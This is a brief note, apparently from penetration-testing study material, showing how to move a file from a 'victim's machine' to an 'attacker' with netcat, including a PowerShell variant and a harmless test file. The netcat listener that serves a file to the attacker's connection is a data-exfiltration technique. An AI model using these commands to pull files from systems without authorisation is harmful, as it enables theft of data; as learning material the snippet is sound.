##### Victim's Machine
PowerShell doesn't support redirection, but we can use 'Get-Content'
```
echo this is text > text.txt
nc -l -p 2222 < text.txt ||| Get-Content text.txt | nc -l -p 2222
```

##### Attacker
```
nc ip 2222 > received.txt
cat received.txt
```

The text should be 'this is text'